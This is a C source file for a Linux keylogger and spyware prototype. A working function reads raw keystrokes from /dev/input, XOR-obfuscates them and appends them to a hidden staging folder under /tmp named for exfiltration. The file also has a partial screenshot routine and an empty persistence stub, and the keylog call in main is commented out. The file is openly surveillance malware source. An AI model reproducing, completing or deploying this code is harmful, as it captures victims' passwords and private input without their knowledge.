#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>
#include <fcntl.h>

#include <X11/Xlib.h>
#include <sys/stat.h>
#include <sys/types.h>

#include <linux/input.h>

#define EXFILTRATE_DIR "/tmp/nguyendh"
#define KEYLOG_FILENAME "/key.txt"
#define SCREENSHOT_DIR "/screenshot"

const char* keymap[85] = {
    "KEY_RESERVED", "KEY_ESC", "KEY_1", "KEY_2", "KEY_3", "KEY_4", "KEY_5", "KEY_6", "KEY_7", "KEY_8", "KEY_9", "KEY_0", "KEY_MINUS", "KEY_EQUAL", "KEY_BACKSPACE", "KEY_TAB", "KEY_Q", "KEY_W", "KEY_E", "KEY_R", "KEY_T",
    "KEY_Y", "KEY_U", "KEY_I", "KEY_O", "KEY_P", "KEY_LEFTBRACE", "KEY_RIGHTBRACE", "KEY_ENTER", "KEY_LEFTCTRL", "KEY_A", "KEY_S", "KEY_D", "KEY_F", "KEY_G", "KEY_H", "KEY_J", "KEY_K", "KEY_L", "KEY_SEMICOLON", "KEY_APOSTROPHE", "KEY_GRAVE",
    "KEY_LEFTSHIFT", "KEY_BACKSLASH", "KEY_Z", "KEY_X", "KEY_C", "KEY_V", "KEY_B", "KEY_N", "KEY_M", "KEY_COMMA", "KEY_DOT", "KEY_SLASH", "KEY_RIGHTSHIFT", "KEY_KPASTERISK", "KEY_LEFTALT", "KEY_SPACE", "KEY_CAPSLOCK", "KEY_F1", "KEY_F2", "KEY_F3",
    "KEY_F4", "KEY_F5", "KEY_F6", "KEY_F7", "KEY_F8", "KEY_F9", "KEY_F10", "KEY_NUMLOCK", "KEY_SCROLLLOCK", "KEY_KP7", "KEY_KP8", "KEY_KP9", "KEY_KPMINUS", "KEY_KP4", "KEY_KP5", "KEY_KP6", "KEY_KPPLUS", "KEY_KP1", "KEY_KP2", "KEY_KP3", "KEY_KP0", "KEY_KPDOT"
};

void xor(char* keymap){
    for (int i = 0; i <= strlen(keymap); i++) {
        keymap[i] ^= 0x45;
    }
}

void persistent() {
    // to do later
}

void screenshot() {
    Display* screen = XOpenDisplay(NULL);
    if (screen == NULL) {
        perror("Cannot connect to the screen");
        return;
    }
    Window root = DefaultRootWindow(screen);

    //https://tronche.com/gui/x/xlib/display/image-format-macros.html
    int screenNumber = DefaultScreen(screen);
    int height = DisplayHeight(screen, screenNumber);
    int width = DisplayWidth(screen, screenNumber);

    // XImage* capture = XGetImage(screen, root, 0,0,width,height,AllPlanes, )
    // printf("Screen height: %d\n", height);
    // printf("Screen witdh %d", width);


    XCloseDisplay(screen);  // Always clean up!
}


void keylog(char* filename, char* outputFile) {
    int file = open(filename, O_RDONLY);
    if (file < 0) {
        perror("open failed");
        return;
    }

    FILE* result = fopen(outputFile, "a+");
    if (result == NULL) {
        perror("fopen failed");
        close(file);
        return;
    }
    struct input_event ev;
    while (true) {
        ssize_t n = read(file, &ev, sizeof(ev));
        if (n == sizeof(ev)) {
            if (ev.type == EV_KEY && ev.value == 0) {
                if (ev.code < 85 && ev.code != 1) {
                    char key[64];
                    strncpy(key,keymap[ev.code],sizeof(key));
                    xor(key);
                    fprintf(result, "%s ", key);
                    fflush(result);
                    printf("%s ", keymap[ev.code]);
                    fflush(stdout);
                } else if (ev.code == 1) {
                    break;
                }else {
                    printf("Unknown key code: %d\n", ev.code);
                }
            }
        }
    }
    fclose(result);
    close(file);
}


int main(int argc, char* argv[]) {
    char keylogPath[512], screenshotPath[512];
    snprintf(keylogPath, sizeof(keylogPath), "%s%s", EXFILTRATE_DIR, KEYLOG_FILENAME);
    snprintf(screenshotPath, sizeof(screenshotPath), "%s%s", EXFILTRATE_DIR, SCREENSHOT_DIR );

    if (opendir(EXFILTRATE_DIR) == NULL) {
        mkdir(EXFILTRATE_DIR,0777);
        mkdir(screenshotPath, 0777);
        int file  = open(keylogPath, O_RDWR|O_CREAT, 0777);
        printf("[+] Create dir at %s\n", EXFILTRATE_DIR);
        printf("[+] Create screenshot path at %s\n", screenshotPath);
        if (file  < 0) {
            perror("Error Create file");
        }
    }

    // keylog("/dev/input/event6", keylogPath);
    screenshot();

    return 0;
}